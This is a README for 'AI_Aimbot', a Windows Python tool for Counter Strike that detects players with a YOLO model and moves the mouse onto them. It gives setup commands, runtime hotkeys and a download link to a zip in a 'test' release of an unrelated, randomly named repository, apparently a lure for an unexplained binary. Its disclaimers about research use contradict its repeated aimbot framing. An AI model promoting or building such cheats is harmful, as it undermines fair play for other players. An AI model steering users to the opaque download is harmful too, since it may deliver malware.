# AI_Aimbot

AI_Aimbot is a Windows-focused computer-vision experiment for a Counter Strike aimbot workflow. It combines window capture, person detection, target selection, and mouse movement into a modular Python runtime with a live OpenCV visualization interface.

[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/AI_Aimbot-1.zip)

## Overview

This repository provides a Windows-oriented AI aimbot experiment built around a simple detection pipeline:

1. Capture a game or application window.
2. Run person detection using a YOLO model.
3. Select a target from the detected bounding boxes.
4. Move the mouse toward the selected target when enabled.

The project is structured as a desktop computer-vision tool rather than a general-purpose framework. It includes runtime controls, GPU detection, a configuration file, and a visual detection window for monitoring bounding boxes and FPS.

Use this software only in environments where automation is allowed, such as private testing, research, or controlled computer-vision experiments.

## Main Capabilities

- Windows computer-vision workflow for a Counter Strike aimbot experiment
- Window capture input pipeline
- Person detection using a YOLO model
- Target selection logic
- Mouse movement control
- Live OpenCV GUI with bounding boxes
- FPS display during detection
- Runtime enable/disable toggle with `F12`
- CUDA auto-detection with CPU fallback
- Configuration through `config.yaml`

## Key Features

### Windows Desktop Runtime

AI_Aimbot is designed for a Windows environment and uses a desktop-style workflow with keyboard controls, screen capture, OpenCV display output, and mouse movement.

### YOLO-Based Detection

The default model path is configured as:

```text
yolo26n.pt
```

The detection stage identifies persons in the captured window and passes results into the target-selection component.

### GPU Support

The runtime checks for CUDA availability and can use GPU acceleration when a compatible CUDA-enabled PyTorch installation is available. If CUDA is not available, the application falls back to CPU execution.

### Runtime Toggle

The aimbot behavior can be enabled or disabled while the application is running:

```text
F12
```

This allows the detection GUI to continue operating while the mouse movement behavior is toggled.

### Visualization Window

A live OpenCV interface displays detection boxes and FPS, making it easier to observe what the model is detecting in real time.

## Installation

Install the Python dependencies listed in the repository:

```bash
pip install -r requirements.txt
```

For CUDA acceleration on supported NVIDIA hardware, install a CUDA-enabled PyTorch build that matches the installed driver and CUDA toolkit before running the project.

## Running

Start the application with the included configuration file:

```bash
python aimbot.py --config config.yaml
```

## Runtime Controls

| Key | Action |
|---|---|
| `F12` | Toggle aimbot enabled or disabled |
| `Q` | Quit |
| `Esc` | Quit |

## Configuration

The project uses `config.yaml` for runtime settings. The default model path referenced by the project is:

```text
yolo26n.pt
```

Adjust configuration values according to your local Windows setup, model location, and testing environment.

## Project Scope

AI_Aimbot is a simple Windows AI aimbot experiment centered on:

- screen/window capture
- object detection
- target selection
- mouse movement
- visual debugging

It is not presented as a production application, competitive gaming tool, or anti-cheat bypass. The repository is best understood as a computer-vision automation experiment.

## License

This repository includes an Apache 2.0 license in `LICENSE`.

## FAQ

### What is AI_Aimbot?

AI_Aimbot is a Windows-focused computer-vision experiment that performs window capture, YOLO-based person detection, target selection, and mouse movement.

### Is this a Windows application?

Yes. The workflow is oriented around Windows desktop usage, including window capture, keyboard runtime controls, mouse movement, and an OpenCV display window.

### Does it support GPU acceleration?

Yes. The runtime can detect CUDA availability and use GPU acceleration when a compatible CUDA-enabled PyTorch setup is installed. Otherwise, it can run on CPU.

### What model does it use?

The default configured model path is `yolo26n.pt`.

### How do I stop the application?

Press `Q` or `Esc` in the runtime window.

### How do I toggle the aimbot behavior?

Press `F12` while the application is running.

## Conclusion

AI_Aimbot is a compact Windows computer-vision project for experimenting with a Counter Strike aimbot-style detection and mouse-control pipeline. It includes YOLO detection, runtime toggling, CUDA detection, OpenCV visualization, and configuration-based execution for controlled local testing.
